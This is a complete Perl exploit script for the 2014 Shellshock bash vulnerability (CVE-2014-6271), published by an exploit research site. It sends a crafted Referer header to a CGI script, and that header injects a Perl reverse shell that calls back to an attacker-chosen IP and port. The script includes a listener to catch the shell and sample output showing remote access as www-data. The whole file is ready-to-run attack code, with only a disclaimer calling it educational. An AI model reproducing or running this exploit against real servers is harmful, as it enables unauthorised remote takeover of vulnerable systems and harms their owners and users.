#!/usr/bin/perl
#
# Title: Bash/cgi command execution exploit
# CVE: CVE-2014-6271
# Author: Simo Ben youssef
# Contact: Simo_at_Morxploit_com
# Coded: 25 September 2014
# Published: 26 September 2014
# MorXploit Research
# http://www.MorXploit.com
#
# Description:
# Perl code to exploit CVE-2014-6271.  
# Injects a Perl connect back shell. 
#
# Download:
# http://www.morxploit.com/morxploits/morxbash.pl
#
# Requires LWP::UserAgent
# apt-get install libwww-perl
# yum install libwww-perl
# perl -MCPAN -e 'install Bundle::LWP'
# For SSL support:
# apt-get install liblwp-protocol-https-perl
# yum install perl-Crypt-SSLeay
#
# Tested on:
# Apache 2.4.7 / Ubuntu 14.04.1 LTS / Bash 4.3.11(1)-release (x86_64-pc-linux-gnu)
#
# Demo:
# perl morxbash.pl http://localhost cgi-bin/test.cgi 127.0.0.1 1111
#
# ===================================================
# --- Bash/cgi remote command execution exploit
# --- By: Simo Ben youssef <simo_at_morxploit_com>
# --- MorXploit Research www.MorXploit.com
# ===================================================
# [*] MorXploiting http://localhost/cgi-bin/test.cgi
# [+] Sent payload! Waiting for connect back shell ...
# [+] Et voila you are in!
#
# Linux MorXploit 3.13.0-24-generic #47-Ubuntu SMP Fri May 2 23:30:00 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
# uid=33(www-data) gid=33(www-data) groups=33(www-data)
#
# Author disclaimer:
# The information contained in this entire document is for educational, demonstration and testing purposes only.
# Author cannot be held responsible for any malicious use or dammage. Use at your own risk.
#

use LWP::UserAgent;
use IO::Socket;
use strict;

sub banner {
system(($^O eq 'MSWin32') ? 'cls' : 'clear');
print "===================================================\n";
print "--- Bash/cgi remote command execution exploit\n";
print "--- By: Simo Ben youssef <simo_at_morxploit_com>\n";
print "--- MorXploit Research www.MorXploit.com\n";
print "===================================================\n";
}

if (!defined ($ARGV[0] && $ARGV[1] && $ARGV[2] && $ARGV[3])) {
banner();
print "perl $0 <target> <cgi script path> <connectbackIP> <connectbackport>\n";
print "perl $0 http://localhost cgi-bin/test.cgi 127.0.0.1 31337\n";
exit;
}

my $host = $ARGV[0];
my $dir = $ARGV[1];
my $cbhost = $ARGV[2];
my $cbport = $ARGV[3];
my $other = "http://localhost:81";
$| = 1;
$SIG{CHLD} = 'IGNORE';

my $l_sock = IO::Socket::INET->new(
Proto => "tcp",
LocalPort => "$cbport",
Listen => 1,
LocalAddr => "0.0.0.0",
Reuse => 1,
) or die "[-] Could not listen on $cbport: $!\n";

sub randomagent {
my @array = ('Mozilla/5.0 (Windows NT 5.1; rv:31.0) Gecko/20100101 Firefox/31.0',
'Mozilla/5.0 (Windows NT 6.1; WOW64; rv:29.0) Gecko/20120101 Firefox/29.0',
'Mozilla/5.0 (compatible; MSIE 10.0; Windows NT 6.1; WOW64; Trident/6.0)',
'Mozilla/5.0 (Windows NT 6.3; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/37.0.2049.0 Safari/537.36',
'Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/36.0.1985.67 Safari/537.36',
'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.31 (KHTML, like Gecko) Chrome/26.0.1410.63 Safari/537.31'
);
my $random = $array[rand @array];
return($random);
}
my $useragent = randomagent();

my $ua = LWP::UserAgent->new(ssl_opts => { verify_hostname => 0 });
$ua->timeout(10);
$ua->agent($useragent);
my $status = $ua->get("$host/$dir");
unless ($status->is_success) {
banner();
print "[-] Error: " . $status->status_line . "\n";
exit;
}

banner();
print "[*] MorXploiting $host/$dir\n";

my $payload = "() { :; }; /bin/bash -c \"perl -e '\\\$p=fork;exit,if(\\\$p); use Socket; use FileHandle; my \\\$system = \\\"/bin/sh\\\"; my \\\$host = \\\"$cbhost\\\"; my \\\$port = \\\"$cbport\\\";socket(SOCKET, PF_INET, SOCK_STREAM, getprotobyname(\\\"tcp\\\")); connect(SOCKET, sockaddr_in(\\\$port, inet_aton(\\\$host))); SOCKET->autoflush(); open(STDIN, \\\">&SOCKET\\\"); open(STDOUT,\\\">&SOCKET\\\"); open(STDERR,\\\">&SOCKET\\\"); print \\\"[+] Et voila you are in!\\\\n\\\\n\\\"; system(\\\"uname -a;id\\\"); system(\\\$system);'\"";
my $exploit = $ua->get("$host/$dir", Referer => "$payload");
print "[+] Sent payload! Waiting for connect back shell ...\n";
my $a_sock = $l_sock->accept();
$l_sock->shutdown(SHUT_RDWR);
copy_data_bidi($a_sock);

sub copy_data_bidi {
my ($socket) = @_;
my $child_pid = fork();
if (! $child_pid) {
close(STDIN);
copy_data_mono($socket, *STDOUT);
$socket->shutdown(SHUT_RD);
exit();
} else {
close(STDOUT);
copy_data_mono(*STDIN, $socket);
$socket->shutdown(SHUT_WR);
kill("TERM", $child_pid);
}
}
sub copy_data_mono {
my ($src, $dst) = @_;
my $buf;
while (my $read_len = sysread($src, $buf, 4096)) {
my $write_len = $read_len;
while ($write_len) {
my $written_len = syswrite($dst, $buf);
return unless $written_len;
$write_len -= $written_len;
}
}
}
